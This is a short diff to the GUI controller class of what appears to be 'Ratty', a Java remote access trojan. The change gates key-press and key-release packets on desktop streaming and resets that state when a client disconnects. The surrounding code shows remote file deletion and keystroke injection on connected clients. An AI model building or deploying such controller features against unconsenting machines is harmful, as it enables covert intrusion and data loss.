@@ -32,7 +32,6 @@ import de.sogomn.rat.util.FrameEncoder.IFrame;
  * THIS CLASS IS A MESS!
  * I HAVE NO IDEA HOW ONE MAKES NON-MESSY CONTROLLER CLASSES
  */
-
 public final class RattyGuiController implements IServerObserver, IClientObserver, IGuiController {
 	
 	private RattyGui gui;
@@ -71,6 +70,8 @@ public final class RattyGuiController implements IServerObserver, IClientObserve
 	}
 	
 	private IPacket getPacket(final String command, final ServerClient serverClient) {
+		final boolean streamingDesktop = serverClient.isStreamingDesktop();
+		
 		IPacket packet = null;
 		
 		if (command == RattyGui.POPUP) {
@@ -127,12 +128,12 @@ public final class RattyGuiController implements IServerObserver, IClientObserve
 			packet = new DeleteFilePacket(path);
 			
 			treePanel.removeFile(path);
-		} else if (command == DisplayPanel.KEY_PRESSED) {
+		} else if (command == DisplayPanel.KEY_PRESSED && streamingDesktop) {
 			final DisplayPanel displayPanel = serverClient.getDisplayPanel();
 			final int key = displayPanel.getLastKeyHit();
 			
 			packet = new KeyEventPacket(key, KeyEventPacket.PRESS);
-		} else if (command == DisplayPanel.KEY_RELEASED) {
+		} else if (command == DisplayPanel.KEY_RELEASED && streamingDesktop) {
 			final DisplayPanel displayPanel = serverClient.getDisplayPanel();
 			final int key = displayPanel.getLastKeyHit();
 			
@@ -215,6 +216,9 @@ public final class RattyGuiController implements IServerObserver, IClientObserve
 	public void clientDisconnected(final ActiveClient client) {
 		final ServerClient serverClient = getServerClient(client);
 		final FileTreePanel treePanel = serverClient.getTreePanel();
+		
+		serverClient.setStreamingDesktop(false);
+		serverClient.setController(null);
 		
 		client.setObserver(null);
 		client.close();
